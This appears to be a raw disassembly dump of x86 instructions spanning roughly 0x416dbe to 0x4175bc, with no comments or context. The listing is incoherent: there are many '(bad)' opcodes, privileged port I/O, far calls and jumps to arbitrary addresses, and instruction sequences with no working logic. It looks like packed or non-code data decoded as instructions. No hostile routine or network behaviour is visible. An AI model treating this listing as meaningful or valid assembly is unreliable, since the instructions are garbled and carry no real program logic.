  416dbe:	aad    0xb4
  416dc0:	ds dec edi
  416dc2:	das    
  416dc3:	addr16 jl 0x416d97
  416dc6:	aad    0xec
  416dc8:	in     eax,dx
  416dc9:	add    DWORD PTR [ecx],edx
  416dcb:	push   ebx
  416dcc:	jle    0x416e38
  416dce:	hlt    
  416dcf:	cdq    
  416dd0:	fisubr DWORD PTR [eax]
  416dd2:	fcomp  QWORD PTR [ecx+0x41d43141]
  416dd8:	outs   dx,DWORD PTR ds:[esi]
  416dd9:	cmc    
  416dda:	out    dx,eax
  416ddb:	adc    bh,BYTE PTR [esi-0x3e7759e8]
  416de1:	xchg   edi,eax
  416de2:	mov    al,ds:0xe57920f7
  416de7:	out    0x77,eax
  416de9:	cwde   
  416dea:	or     eax,0x24015df
  416def:	inc    ebp
  416df0:	jl     0x416dd0
  416df2:	cld    
  416df3:	pop    eax
  416df4:	ds mov al,0x34
  416df7:	in     eax,0x2c
  416df9:	xchg   ecx,eax
  416dfa:	xor    DWORD PTR [esi+0x75],ecx
  416dfd:	fs int 0xf
  416e00:	cmp    ebx,edi
  416e02:	jno    0x416de6
  416e04:	mov    ds:0x14fdb4ee,eax
  416e09:	xchg   BYTE PTR [ebp+0x197cc341],bl
  416e0f:	call   0xa0d0:0xdc2c782c
  416e16:	fimul  WORD PTR [esp+eiz*4]
  416e19:	xchg   edi,eax
  416e1a:	mov    ecx,0x13ea27dd
  416e1f:	cmp    eax,0x39954356
  416e24:	sub    DWORD PTR ds:0x2da2f118,0x7a
  416e2b:	fmul   st,st(3)
  416e2d:	mov    edi,0x740e0aae
  416e32:	hlt    
  416e33:	aad    0xe7
  416e35:	inc    esi
  416e36:	andnps xmm6,XMMWORD PTR [eax+0x5f47e141]
  416e3d:	sbb    eax,0xea40b17b
  416e42:	xor    edx,DWORD PTR [ecx+esi*2+0x6a]
  416e46:	imul   ebx,esi,0x3834a062
  416e4c:	mov    edx,0x23703637
  416e51:	pop    ds
  416e52:	jp     0x416e96
  416e54:	mov    edx,0xece2e551
  416e59:	inc    ebp
  416e5a:	sbb    ch,dh
  416e5c:	or     ch,BYTE PTR [edi-0x26612b66]
  416e62:	mov    eax,ds:0xf4b1999f
  416e67:	or     al,0x58
  416e69:	pop    eax
  416e6a:	jns    0x416e94
  416e6c:	aaa    
  416e6d:	jae    0x416e5d
  416e6f:	jmp    0xbfc54da2
  416e74:	cli    
  416e75:	les    ebp,FWORD PTR [edx+0x5b473eeb]
  416e7b:	sub    eax,0xb4a78012
  416e80:	gs stos DWORD PTR es:[edi],eax
  416e82:	jg     0x416ee6
  416e84:	mov    ah,0xa9
  416e86:	shl    esp,0x7d
  416e89:	mov    al,0x6e
  416e8b:	jecxz  0x416ee7
  416e8d:	pop    edx
  416e8e:	not    dh
  416e90:	mov    edi,0x3303866
  416e95:	popa   
  416e96:	cmc    
  416e97:	inc    eax
  416e98:	push   ss
  416e99:	adc    al,BYTE PTR [ecx]
  416e9b:	ret    0xf751
  416e9e:	sub    ch,BYTE PTR [ebp-0x56]
  416ea1:	sbb    edx,DWORD PTR [esi-0x6a748c14]
  416ea7:	arpl   WORD PTR [ecx+0x330a4c92],cx
  416ead:	mov    WORD PTR [edx],gs
  416eaf:	(bad)  
  416eb0:	rcl    DWORD PTR [edi+0x36],1
  416eb3:	clc    
  416eb4:	cmp    edx,DWORD PTR [ebx+0x56]
  416eb7:	mov    WORD PTR ds:0x91852476,ss
  416ebd:	daa    
  416ebe:	add    DWORD PTR [ebp+0x29576d96],edi
  416ec4:	retf   0x9930
  416ec7:	xor    DWORD PTR [esi],eax
  416ec9:	cwde   
  416eca:	xchg   esp,eax
  416ecb:	cs xchg ecx,eax
  416ecd:	imul   ebx,DWORD PTR [edi-0x26],0xa512221e
  416ed4:	mov    esp,0x200403a
  416ed9:	aaa    
  416eda:	int    0xac
  416edc:	cmp    DWORD PTR ds:0x4a09eb6c,edx
  416ee2:	lods   eax,DWORD PTR ds:[esi]
  416ee3:	add    ecx,ebp
  416ee5:	xor    ah,BYTE PTR [edi]
  416ee7:	mov    esp,0xda05901b
  416eec:	rol    DWORD PTR [esi+0x1f],0xca
  416ef0:	fwait
  416ef1:	cmp    DWORD PTR [ecx-0x398176f4],ecx
  416ef7:	iret   
  416ef8:	test   al,0x46
  416efa:	rcl    DWORD PTR [ebx+0x4edef42],cl
  416f00:	shl    BYTE PTR [esi+0x5b486aef],1
  416f06:	aam    0x64
  416f08:	iret   
  416f09:	sub    al,0x2a
  416f0b:	add    eax,0xfdf7f7df
  416f10:	fisub  WORD PTR [ecx+0x5a]
  416f13:	jne    0x416f7f
  416f15:	adc    ebp,esp
  416f17:	out    dx,al
  416f18:	sbb    ebx,ebx
  416f1a:	dec    ebp
  416f1b:	xchg   ebx,eax
  416f1c:	sbb    esi,DWORD PTR [edi-0x26936aaf]
  416f22:	mov    eax,0x30c98479
  416f27:	fwait
  416f28:	adc    bl,BYTE PTR [eax+0x42]
  416f2b:	pop    ebp
  416f2c:	add    ah,dh
  416f2e:	sbb    BYTE PTR [edx-0x38e5daf6],dh
  416f34:	adc    bh,BYTE PTR [edi]
  416f36:	add    eax,0x1df4f7d8
  416f3b:	popf   
  416f3c:	lods   al,BYTE PTR ds:[esi]
  416f3d:	lods   al,BYTE PTR ds:[esi]
  416f3e:	or     al,0x77
  416f40:	stos   DWORD PTR es:[edi],eax
  416f41:	rol    DWORD PTR [esi+0x40736e74],0xe6
  416f48:	inc    edx
  416f49:	cld    
  416f4a:	mov    dl,0x49
  416f4c:	retf   
  416f4d:	fld    TBYTE PTR [ecx*8+0x5f6d6e71]
  416f54:	jnp    0x416f9e
  416f56:	inc    edx
  416f57:	pop    edx
  416f58:	pop    edx
  416f59:	int    0xe2
  416f5b:	int3   
  416f5c:	lods   eax,DWORD PTR ds:[esi]
  416f5d:	mov    ch,0xc0
  416f5f:	nop
  416f60:	xor    eax,0xebe63502
  416f65:	in     eax,dx
  416f66:	xor    dh,BYTE PTR [edi]
  416f68:	test   al,0x59
  416f6a:	mov    edx,0x4cf2d9d3
  416f6f:	ror    DWORD PTR [edx+0x19],0x2c
  416f73:	and    eax,0xbbfa6d78
  416f78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f79:	loopne 0x416f49
  416f7b:	push   DWORD PTR [ecx-0x667982b4]
  416f81:	inc    edi
  416f82:	in     al,dx
  416f83:	in     eax,0xea
  416f85:	loope  0x416f29
  416f87:	mov    WORD PTR ds:0x4763b609,fs
  416f8d:	js     0x416fbd
  416f8f:	push   cs
  416f90:	fcom   st(6)
  416f92:	retf   
  416f93:	jbe    0x416f3f
  416f95:	hlt    
  416f96:	push   ebx
  416f97:	dec    edx
  416f98:	sbb    ecx,ebx
  416f9a:	mov    ah,0xe8
  416f9c:	or     eax,0xeecc4c1
  416fa1:	imul   esp,DWORD PTR [ebx+0x47],0x62
  416fa5:	jg     0x416f7b
  416fa7:	push   cs
  416fa8:	inc    DWORD PTR [ecx+0x4700f083]
  416fae:	sar    BYTE PTR [edx+0x11f5d72d],cl
  416fb4:	xlat   BYTE PTR ds:[ebx]
  416fb5:	inc    edi
  416fb6:	add    eax,0xff0f0622
  416fbb:	sub    BYTE PTR [eax-0x7f],al
  416fbe:	inc    ecx
  416fbf:	mov    edi,0xb687c142
  416fc4:	scas   eax,DWORD PTR es:[edi]
  416fc5:	mov    esi,0x1ed6bb89
  416fca:	sbb    al,0x78
  416fcc:	mov    ah,ah
  416fce:	aam    0x39
  416fd0:	fiadd  DWORD PTR [esi]
  416fd2:	push   0xb
  416fd4:	shl    DWORD PTR [ecx+0x3a],0xe4
  416fd8:	jbe    0x416f70
  416fda:	in     al,dx
  416fdb:	push   0xffffffc5
  416fdd:	xor    al,0xbf
  416fdf:	push   ebx
  416fe0:	xchg   edi,eax
  416fe1:	in     eax,0x22
  416fe3:	popf   
  416fe4:	mov    es,WORD PTR [ebp+0x1]
  416fe7:	mov    edx,gs
  416fe9:	inc    eax
  416fea:	mov    WORD PTR [eax+0x3c],?
  416fed:	retf   0x24b6
  416ff0:	pop    esi
  416ff1:	add    ecx,edi
  416ff3:	dec    ebx
  416ff4:	fmul   st(5),st
  416ff6:	inc    edi
  416ff7:	div    BYTE PTR [eax]
  416ff9:	adc    BYTE PTR [ecx+0x77],al
  416ffc:	jge    0x417066
  416ffe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416fff:	mov    ds:0x93b1ff75,eax
  417004:	jo     0x417047
  417006:	aaa    
  417007:	pop    ss
  417008:	les    ebx,FWORD PTR [edx]
  41700a:	ds inc ebx
  41700c:	bound  ebx,QWORD PTR [edi+ecx*2-0x3b5bfc46]
  417013:	cmp    dh,bh
  417015:	mov    bh,0x2d
  417017:	les    esi,FWORD PTR [edx-0x34]
  41701a:	jle    0x417039
  41701c:	mov    cl,0x7d
  41701e:	add    dh,BYTE PTR [edi]
  417020:	inc    edi
  417021:	cld    
  417022:	xchg   edi,eax
  417023:	xchg   DWORD PTR ds:0x6315f521,ecx
  417029:	or     DWORD PTR [esi+0x38633caf],edi
  41702f:	or     esp,DWORD PTR [ecx-0x48]
  417032:	xchg   edi,eax
  417033:	loop   0x4170a7
  417035:	div    ecx
  417037:	and    BYTE PTR [esp+eiz*2+0x32],ah
  41703b:	rcr    DWORD PTR [edi+eiz*8-0x4c],cl
  41703f:	mov    eax,ds:0xd3845468
  417044:	xor    dh,BYTE PTR [edx+0x2d9d1520]
  41704a:	ja     0x417019
  41704c:	push   esp
  41704d:	fstp   TBYTE PTR [eax]
  41704f:	add    BYTE PTR [ebx-0x70],bh
  417052:	lds    ecx,FWORD PTR [ebp+0x40dd7a49]
  417058:	or     ebp,edi
  41705a:	cdq    
  41705b:	imul   cx,WORD PTR [ebp+0x47],0x1b78
  417061:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417062:	push   eax
  417063:	out    0x9a,eax
  417065:	add    eax,0x9ed7126e
  41706a:	mov    ?,WORD PTR [eax+0x5b8cc383]
  417070:	xor    edx,0x16
  417073:	mov    ebx,DWORD PTR [esi-0x1f]
  417076:	call   0x2256c564
  41707b:	adc    ecx,eax
  41707d:	sbb    eax,0xc28d378e
  417082:	leave  
  417083:	imul   edi,DWORD PTR [ebx+0x11530608],0xffffffb0
  41708a:	mov    esi,0x5fa8c4e3
  41708f:	mov    dl,0x95
  417091:	mov    ebp,0x30487b09
  417096:	ror    DWORD PTR [esi],cl
  417098:	ret    0xbe75
  41709b:	mov    bh,0x28
  41709d:	cmp    eax,0x3421ea13
  4170a2:	icebp  
  4170a3:	retf   
  4170a4:	clc    
  4170a5:	in     eax,0xc6
  4170a7:	in     eax,dx
  4170a8:	fs jp  0x4170e2
  4170ab:	xor    bh,BYTE PTR [edi+esi*1]
  4170ae:	rcr    DWORD PTR [edi+eax*2],0x66
  4170b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170b3:	std    
  4170b4:	and    DWORD PTR [eax-0x53],ecx
  4170b7:	mov    ecx,DWORD PTR [eax]
  4170b9:	arpl   WORD PTR [ecx-0x6],cx
  4170bc:	jmp    0x9b7a67a
  4170c1:	pop    edx
  4170c2:	xchg   edx,eax
  4170c3:	out    dx,eax
  4170c4:	sbb    edi,edi
  4170c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170c7:	mov    ebx,0xd2370eac
  4170cc:	push   eax
  4170cd:	std    
  4170ce:	inc    edx
  4170cf:	cld    
  4170d0:	les    esp,FWORD PTR [edx]
  4170d2:	jns    0x417113
  4170d4:	push   ebx
  4170d5:	jmp    0x9049acc9
  4170da:	js     0x4170f9
  4170dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170dd:	xor    eax,DWORD PTR [ebx+ebp*8+0x10]
  4170e1:	cmp    al,0x6f
  4170e3:	cmp    DWORD PTR [eax-0x7b],eax
  4170e6:	bound  esi,QWORD PTR [esi+0x18]
  4170e9:	ror    esp,0x68
  4170ec:	retf   0x5b02
  4170ef:	hlt    
  4170f0:	xlat   BYTE PTR ds:[ebx]
  4170f1:	dec    esi
  4170f2:	ret    
  4170f3:	jns    0x41715a
  4170f5:	xor    edi,DWORD PTR [edx-0x290c3056]
  4170fb:	js     0x4170a4
  4170fd:	push   es
  4170fe:	jno    0x417118
  417100:	xchg   edi,eax
  417101:	sbb    ecx,DWORD PTR [esi]
  417103:	cmp    ch,BYTE PTR [edx-0x9]
  417106:	stos   DWORD PTR es:[edi],eax
  417107:	mov    WORD PTR [esi],es
  417109:	mov    eax,0x15c41aa
  41710e:	lea    ebx,[eax-0x54a36bbc]
  417114:	ss addr16 xchg esp,eax
  417117:	xlat   BYTE PTR ds:[ebx]
  417118:	push   ds
  417119:	daa    
  41711a:	(bad)  
  41711b:	mov    WORD PTR [edi+0x4c0b8f6f],fs
  417121:	rol    DWORD PTR [eax-0x202bf7e9],1
  417127:	add    edx,DWORD PTR [ecx-0x32]
  41712a:	add    DWORD PTR [eax+esi*4],0x4f
  41712e:	mov    ds:0x3032c71e,al
  417133:	and    BYTE PTR [eax-0x7bf114eb],0xab
  41713a:	sbb    BYTE PTR [eax-0x3c],dh
  41713d:	loopne 0x4171a3
  41713f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417140:	repz dec esp
  417142:	sbb    BYTE PTR ds:0x2f5a0031,ch
  417148:	cmp    esp,DWORD PTR [eax]
  41714a:	or     ebx,eax
  41714c:	xor    cl,BYTE PTR [ebx+0x2b]
  41714f:	out    0x44,al
  417151:	inc    edx
  417152:	xchg   ebx,eax
  417153:	mov    eax,ds:0x2b450c2b
  417158:	retf   
  417159:	fst    QWORD PTR [ecx+0x26]
  41715c:	inc    ecx
  41715d:	cmp    ecx,DWORD PTR [edi-0x55]
  417160:	aam    0x27
  417162:	jl     0x4170e7
  417164:	mov    ch,0xa5
  417166:	popf   
  417167:	fscale 
  417169:	ja     0x417169
  41716b:	push   ebp
  41716d:	popa   
  41716e:	or     DWORD PTR [ebp+0x5aa1279b],eax
  417174:	xor    ebp,ebp
  417176:	mov    ?,WORD PTR [ecx+0x21]
  417179:	lods   al,BYTE PTR ds:[esi]
  41717a:	inc    edx
  41717b:	pop    es
  41717c:	(bad)  
  41717d:	jmp    0x41711e
  41717f:	add    dh,ah
  417181:	lock addr16 aaa 
  417184:	mov    al,ds:0x600454e0
  417189:	xchg   ecx,eax
  41718a:	enter  0xfb4a,0xaa
  41718e:	ror    BYTE PTR [edx-0x1531d524],cl
  417194:	xchg   esp,eax
  417195:	xchg   esi,eax
  417196:	jp     0x4171c9
  417198:	mov    ebp,0xe4588c2e
  41719d:	mov    ebp,0x14b1d6d1
  4171a2:	adc    eax,0x1142f668
  4171a7:	adc    DWORD PTR [eax+0xb],esp
  4171aa:	inc    esi
  4171ab:	test   cl,cl
  4171ad:	push   eax
  4171ae:	mov    bl,0xc9
  4171b0:	mov    dl,0xee
  4171b2:	out    0xcb,eax
  4171b4:	stos   DWORD PTR es:[edi],eax
  4171b5:	lock cmp eax,0x7b8f8720
  4171bb:	push   eax
  4171bc:	int3   
  4171bd:	dec    ebx
  4171be:	lods   eax,DWORD PTR ds:[esi]
  4171bf:	push   ds
  4171c0:	(bad)  
  4171c1:	fcom   DWORD PTR [ebx+0x4]
  4171c4:	mul    bh
  4171c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171c7:	fiadd  WORD PTR [ebx+0x7f]
  4171ca:	scas   al,BYTE PTR es:[edi]
  4171cb:	sar    BYTE PTR [eax-0x1b],cl
  4171ce:	test   eax,0xa8806e1e
  4171d3:	and    DWORD PTR [ebp+0x23e4045b],esp
  4171d9:	sbb    eax,0xdf6f2d76
  4171de:	adc    esi,DWORD PTR [edx+eiz*4-0x49]
  4171e2:	add    DWORD PTR [edx],0x7b
  4171e5:	dec    edx
  4171e6:	cmc    
  4171e7:	xchg   edi,eax
  4171e8:	inc    eax
  4171e9:	cli    
  4171ea:	jae    0x4171e9
  4171ec:	cmp    BYTE PTR [esi-0x64],0xd
  4171f0:	xchg   edx,eax
  4171f1:	dec    ebx
  4171f2:	jo     0x41717a
  4171f4:	add    DWORD PTR [ebx+eax*2+0x24278c97],0xacc7402
  4171ff:	in     al,0xca
  417201:	into   
  417202:	xor    ecx,DWORD PTR ds:0xedc171ac
  417208:	push   0xe7efa962
  41720d:	inc    eax
  41720e:	test   al,0x3c
  417210:	inc    edi
  417211:	fimul  DWORD PTR [ecx+0x12]
  417214:	stos   BYTE PTR es:[edi],al
  417215:	or     DWORD PTR ds:0x8fd52dad,ecx
  41721b:	rcr    DWORD PTR [esi+ecx*8-0x565b926d],0xa5
  417223:	or     eax,0x9cf65b3e
  417228:	cmp    esp,esi
  41722a:	stos   DWORD PTR es:[edi],eax
  41722b:	adc    ebp,DWORD PTR [edx-0x69]
  41722e:	cmc    
  41722f:	jb     0x417244
  417231:	push   ds
  417232:	pop    ss
  417233:	add    DWORD PTR [ecx],esp
  417235:	call   0xb372:0x1bbfc7f8
  41723c:	stc    
  41723d:	mov    ds:0x8329c774,eax
  417242:	pop    DWORD PTR [eax]
  417244:	ja     0x4171cf
  417246:	imul   edi,DWORD PTR [edx-0x72],0x589c0083
  41724d:	imul   esp
  41724f:	or     ebp,eax
  417251:	or     ah,BYTE PTR [esi-0x5a77ef6b]
  417257:	fs pop edx
  417259:	jo     0x4172d6
  41725b:	lock sbb DWORD PTR ds:0x4dccb247,ebx
  417262:	push   es
  417263:	cs out 0xdb,eax
  417266:	shl    esp,1
  417268:	jl     0x4172c8
  41726a:	push   edx
  41726b:	out    0x98,al
  41726d:	add    edi,DWORD PTR [ebx]
  41726f:	jg     0x41725a
  417271:	outs   dx,DWORD PTR ds:[esi]
  417272:	pushf  
  417273:	call   0xa618:0x922a6717
  41727a:	cdq    
  41727b:	sub    DWORD PTR [edi-0x2fb6c55],esp
  417281:	ja     0x417217
  417283:	dec    esp
  417284:	jge    0x4172bb
  417286:	or     ecx,edx
  417288:	lods   eax,DWORD PTR ds:[esi]
  417289:	cmp    edx,ecx
  41728b:	dec    eax
  41728c:	clc    
  41728d:	cmp    al,0xb6
  41728f:	xchg   edx,eax
  417290:	das    
  417291:	add    dl,BYTE PTR [edx]
  417293:	ja     0x4172c3
  417295:	retf   
  417296:	in     eax,0x9d
  417298:	pop    esp
  417299:	push   ecx
  41729a:	(bad)  
  41729c:	es pop ecx
  41729e:	jo     0x41722f
  4172a0:	and    BYTE PTR [esi+0x600d3395],ch
  4172a6:	lods   eax,DWORD PTR ds:[esi]
  4172a7:	cmp    bh,bl
  4172a9:	xchg   ecx,eax
  4172aa:	fld    DWORD PTR [ebx-0x60]
  4172ad:	ds cmp al,0xf3
  4172b0:	cmc    
  4172b1:	call   0xe81a73c3
  4172b6:	jmp    0x515592ec
  4172bb:	cmp    esi,DWORD PTR [edi+0x4f]
  4172be:	sub    DWORD PTR [esi+edx*1],esi
  4172c1:	dec    edx
  4172c2:	ret    0x7e63
  4172c5:	aaa    
  4172c6:	(bad)  
  4172c8:	repnz mov ebx,0xea5592ef
  4172ce:	inc    esi
  4172cf:	mov    al,0x19
  4172d1:	mov    ds:0xc075c8fb,eax
  4172d6:	adc    al,0xf2
  4172d8:	mov    edx,0xff59ca21
  4172dd:	int    0x77
  4172df:	mov    cl,0x3
  4172e1:	fild   DWORD PTR [edi+0x4de190ea]
  4172e7:	mov    edx,cs
  4172e9:	mov    ah,ch
  4172eb:	or     DWORD PTR [ebx],ebp
  4172ed:	xchg   ebx,eax
  4172ee:	das    
  4172ef:	mov    ds:0x98a8eabd,eax
  4172f4:	nop
  4172f5:	mov    edx,0xa6602ac7
  4172fa:	ss out 0x19,eax
  4172fd:	clc    
  4172fe:	and    al,0x6a
  417300:	push   es
  417301:	adc    DWORD PTR [eax],ebp
  417303:	shl    BYTE PTR [edi+0x167a079c],1
  417309:	or     eax,0x74389281
  41730e:	sbb    DWORD PTR [ebp-0x7d902b23],edi
  417314:	push   ss
  417315:	mov    ebp,0x592093c7
  41731a:	pop    esi
  41731b:	lock jmp 0xa85c357b
  417321:	jmp    FWORD PTR [ebp+eiz*8-0xecbc242]
  417328:	stos   DWORD PTR es:[edi],eax
  417329:	sub    ebp,DWORD PTR [ecx-0x20]
  41732c:	fisub  DWORD PTR [edi+0x458322c9]
  417332:	cmp    ah,BYTE PTR [edi-0x44]
  417335:	(bad)  
  417336:	jecxz  0x41732d
  417338:	in     al,0xfb
  41733a:	jo     0x4172be
  41733c:	popa   
  41733d:	mov    dl,cl
  41733f:	and    bh,ch
  417341:	ret    0xed0c
  417344:	gs or  al,0xc0
  417347:	sar    DWORD PTR [edi],0x2b
  41734a:	lahf   
  41734b:	cmp    eax,0xf88cad87
  417350:	into   
  417351:	and    dh,dl
  417353:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417354:	push   ecx
  417355:	out    0x1d,al
  417357:	popa   
  417358:	mov    ds,edx
  41735a:	std    
  41735b:	mov    dh,0xba
  41735d:	pop    esp
  41735e:	repnz ins DWORD PTR es:[edi],dx
  417360:	outs   dx,BYTE PTR ds:[esi]
  417361:	jecxz  0x41733d
  417363:	sbb    BYTE PTR [eax],0xf2
  417366:	ds inc eax
  417368:	inc    esi
  417369:	pushf  
  41736a:	(bad)
  41736d:	cmp    eax,0x94c63a1e
  417372:	idiv   ecx
  417374:	cli    
  417375:	test   DWORD PTR [edi],ecx
  417377:	jp     0x417368
  417379:	ins    DWORD PTR es:[edi],dx
  41737a:	pop    ds
  41737b:	mov    edi,0x2f7c3fc2
  417380:	add    DWORD PTR [ecx],edi
  417382:	pop    edx
  417383:	jp     0x417317
  417385:	fldenv [ebx]
  417387:	or     esi,DWORD PTR [edx]
  417389:	mov    esi,0xfc8fd8cc
  41738e:	not    eax
  417390:	retf   
  417391:	je     0x417362
  417393:	xchg   ebx,eax
  417394:	ins    BYTE PTR es:[edi],dx
  417395:	mov    ecx,eax
  417397:	enter  0x9e1b,0x15
  41739b:	cwde   
  41739c:	pop    edx
  41739d:	mov    WORD PTR [eax],fs
  41739f:	cmc    
  4173a0:	aam    0x82
  4173a2:	adc    esp,DWORD PTR [edx+0x1e]
  4173a5:	and    edi,0x64
  4173a8:	mov    ebp,0xc9850648
  4173ad:	shl    BYTE PTR [edi-0x52],1
  4173b0:	mov    ebx,0x517c650e
  4173b5:	popf   
  4173b6:	fld    QWORD PTR [ebx+0x7b481f2e]
  4173bc:	push   esp
  4173bd:	pop    ebp
  4173be:	push   ecx
  4173bf:	cs push 0xffffffe0
  4173c2:	sbb    ebx,DWORD PTR [esp+eax*8+0x14]
  4173c6:	mov    dh,al
  4173c8:	mov    cl,0x7c
  4173ca:	ins    BYTE PTR es:[edi],dx
  4173cb:	push   ecx
  4173cc:	lahf   
  4173cd:	cmc    
  4173ce:	mov    cl,0xe9
  4173d0:	test   eax,0x2b9785a5
  4173d5:	fsubp  st(4),st
  4173d7:	sbb    cl,dl
  4173d9:	in     al,0x74
  4173db:	push   ecx
  4173dc:	mov    esi,0x2f51d1a4
  4173e1:	xor    BYTE PTR [edx],0x23
  4173e4:	mov    eax,0xcb9edc9
  4173e9:	test   al,0xab
  4173eb:	sub    DWORD PTR [eax+0x52f1e8ef],ebx
  4173f1:	and    eax,0x23d8e2b0
  4173f6:	sub    DWORD PTR [edx+0x53],edi
  4173f9:	sbb    BYTE PTR [esi],al
  4173fb:	scas   al,BYTE PTR es:[edi]
  4173fc:	inc    esi
  4173fd:	push   ebp
  4173fe:	push   ds
  4173ff:	fsub   DWORD PTR [ebp-0x52]
  417402:	fsubr  QWORD PTR [eax]
  417404:	mov    dl,BYTE PTR [edx]
  417406:	inc    esi
  417407:	add    al,0x4c
  417409:	push   ebp
  41740a:	xchg   ebp,eax
  41740b:	scas   al,BYTE PTR es:[edi]
  41740c:	ret    
  41740d:	pusha  
  41740e:	adc    BYTE PTR [ebx+eiz*4-0x375eb71c],bh
  417415:	dec    esi
  417416:	loopne 0x41745d
  417418:	icebp  
  417419:	and    edi,DWORD PTR [edx+0x54]
  41741c:	mov    ecx,0xd1ab9233
  417421:	jnp    0x4173fa
  417423:	popa   
  417424:	jge    0x417493
  417426:	(bad)  
  417427:	sub    BYTE PTR [eax+eiz*8],ch
  41742a:	add    ecx,DWORD PTR [edx]
  41742c:	lds    eax,FWORD PTR [edi]
  41742e:	fdivr  QWORD PTR [eax+0x1a455153]
  417434:	sti    
  417435:	mov    gs,WORD PTR [edx+0x22]
  417438:	sub    eax,0xee135401
  41743d:	add    DWORD PTR [edx+0x33b2cc46],edi
  417443:	push   ds
  417444:	call   0x8bab:0xe8f4e542
  41744b:	in     al,0x5
  41744d:	js     0x417474
  41744f:	inc    eax
  417450:	pop    ds
  417451:	jmp    0x73805501
  417456:	pop    ebp
  417457:	pop    eax
  417458:	adc    DWORD PTR [esi+0x7f],esp
  41745b:	fbld   TBYTE PTR gs:[edx+ebx*8+0x45ba7241]
  417463:	cdq    
  417464:	or     al,0x92
  417466:	int    0xf3
  417468:	push   cs
  417469:	iret   
  41746a:	and    ebp,edi
  41746c:	jle    0x41747b
  41746e:	shr    esp,cl
  417470:	jne    0x417481
  417472:	ss inc ecx
  417474:	mov    eax,0x82c183b3
  417479:	stc    
  41747a:	mov    edi,0x57f731ce
  41747f:	and    DWORD PTR [ecx],edi
  417481:	and    DWORD PTR [eax-0x6127c249],0xffffffa9
  417488:	lods   al,BYTE PTR ds:[esi]
  417489:	and    eax,0x77b49fb
  41748e:	sbb    BYTE PTR ds:0x55521c31,ch
  417494:	lahf   
  417495:	mov    eax,ds:0x875f7778
  41749a:	sbb    edi,DWORD PTR [edx+ecx*2+0x8]
  41749e:	pop    ss
  41749f:	or     al,0x20
  4174a1:	xor    esi,0xffffffb3
  4174a4:	mov    eax,0x65737368
  4174a9:	inc    edx
  4174aa:	xchg   edx,eax
  4174ab:	popf   
  4174ac:	cli    
  4174ad:	icebp  
  4174ae:	add    al,0xfa
  4174b0:	lods   eax,DWORD PTR ds:[esi]
  4174b1:	ds mov esi,0x490b749
  4174b7:	enter  0xe6a7,0x6c
  4174bb:	scas   al,BYTE PTR es:[edi]
  4174bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174bd:	pop    ebx
  4174be:	mov    ?,WORD PTR [edi+0x457c963b]
  4174c4:	push   es
  4174c5:	xchg   esi,eax
  4174c6:	push   ecx
  4174c7:	sub    al,0x55
  4174c9:	mov    ds:0x7aecc914,eax
  4174ce:	xchg   BYTE PTR [ecx+0x13],dh
  4174d1:	and    al,ah
  4174d3:	add    BYTE PTR [edi+0x34],0xc4
  4174d7:	push   ds
  4174d8:	mov    ch,0xcb
  4174da:	ret    0x11e0
  4174dd:	rcl    BYTE PTR [esi+ebx*1+0x630df7e5],1
  4174e4:	cmp    eax,0x7ead003b
  4174e9:	in     al,0xad
  4174eb:	xor    ebx,eax
  4174ed:	xor    BYTE PTR [edx-0xcc3be06],al
  4174f3:	out    0x4d,eax
  4174f5:	inc    ebp
  4174f6:	sub    ch,BYTE PTR [eax-0x6bf90cf6]
  4174fc:	call   0xc83e8f44
  417501:	outs   dx,BYTE PTR ds:[esi]
  417502:	or     DWORD PTR [eax+esi*1+0x12],edi
  417506:	(bad)  
  417507:	adc    al,0x2
  417509:	xchg   ecx,eax
  41750a:	call   0x1ab:0x47058f03
  417511:	stos   BYTE PTR es:[edi],al
  417512:	push   ebx
  417513:	xchg   ebp,eax
  417514:	fst    DWORD PTR [ebx-0x32ae7b89]
  41751a:	push   esi
  41751b:	push   es
  41751c:	fwait
  41751d:	mov    esi,0x2fe418bb
  417522:	popa   
  417523:	and    DWORD PTR [esi+ecx*4-0x2efddbc1],eax
  41752a:	adc    edi,DWORD PTR [ebp-0xf]
  41752d:	fs das 
  41752f:	cmp    al,0xae
  417531:	(bad)  
  417532:	inc    edi
  417533:	and    ebp,DWORD PTR [edi+0x2f0e5771]
  417539:	inc    edx
  41753a:	cmp    al,0xb1
  41753c:	mov    edi,0xff5dbbee
  417541:	cmc    
  417542:	or     al,0x56
  417544:	jns    0x4174f8
  417546:	test   eax,0x681de157
  41754b:	(bad)  
  41754c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41754d:	retf   0x80c9
  417550:	rol    BYTE PTR [eax],1
  417552:	(bad)
  417555:	sbb    al,0x18
  417557:	popa   
  417558:	sub    edx,edi
  41755a:	and    DWORD PTR [eax+0x7f],ebx
  41755d:	in     eax,0x29
  41755f:	ins    BYTE PTR es:[edi],dx
  417560:	jmp    0x6248:0xf1ef7938
  417567:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417568:	int    0x54
  41756a:	mov    al,0xeb
  41756c:	lock fs and ah,dl
  417570:	shl    BYTE PTR [esp+ebp*2-0x3c4ba907],1
  417577:	xor    eax,0x6cfde9b7
  41757c:	(bad)  
  41757e:	dec    esp
  41757f:	xchg   BYTE PTR [ecx-0x42343edc],cl
  417585:	dec    ecx
  417586:	jl     0x417577
  417588:	xchg   al,bl
  41758a:	popf   
  41758b:	lea    esi,[esi]
  41758d:	mov    bl,0xfe
  41758f:	mov    esp,?
  417591:	fcom   st(1)
  417593:	arpl   WORD PTR [eax-0x2d],bp
  417596:	fs repnz pop eax
  417599:	cdq    
  41759a:	fdivr  QWORD PTR [ebx-0x660cd88f]
  4175a0:	jo     0x4175fd
  4175a2:	pop    ebx
  4175a3:	aad    0xf4
  4175a5:	mov    esp,0xb176bd72
  4175aa:	mov    al,0x5c
  4175ac:	imul   edx,DWORD PTR [ecx-0x7570bef],0x88a2d2b1
  4175b6:	mov    eax,0xa2393452
  4175bb:	(bad)  
  4175bc:	cmp    esp,DWORD PTR [ebp+0x7dfd691c]
